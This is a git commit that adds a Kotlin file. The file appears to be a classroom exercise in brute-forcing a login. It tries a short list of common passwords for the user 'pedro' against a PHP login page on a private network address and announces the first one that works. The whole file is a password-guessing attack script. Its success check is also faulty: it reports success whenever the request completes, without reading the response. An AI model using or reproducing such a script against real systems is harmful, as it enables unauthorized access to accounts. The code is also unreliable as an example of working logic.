13c8eeedfcebe696103533855d2d43adc85f44e0
Oleksandr01001 <oleksandr.hushtyk.07@gmail.com>
2025-10-30 16:00:02 +0100

    update

---
+++ PSP/funcion/src/url.kt
@@ -0,0 +1,45 @@
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import java.net.URI
+
+fun main() {
+    val username = "pedro"
+
+
+    var passwords = listOf("12345", "password", "123456", "qwerty", "admin")
+
+    for (password in passwords) {
+        val success = tryLogin(username, password)
+        if (success) {
+            println("Password encontrado: $password")
+            return
+        } else {
+            println("Password no encontrado: $password")
+        }
+    }
+    println("No encontrado")
+}
+
+fun tryLogin(username: String, password: String): Boolean {
+    return try {
+        val url = URI("http://192.168.2.216/a/fuerzabruta/postraw.php?username=$username&password=$password").toURL()
+        val connection = url.openConnection()
+        val input = connection.getInputStream()
+        val buffer = BufferedReader(InputStreamReader(input))
+
+        var response = ""
+        var line: String?
+        while (buffer.readLine().also { line = it } != null) {
+            response += line
+        }
+
+        buffer.close()
+        input.close()
+
+
+        return true
+
+    } catch (e: Exception) {
+        false
+    }
+}
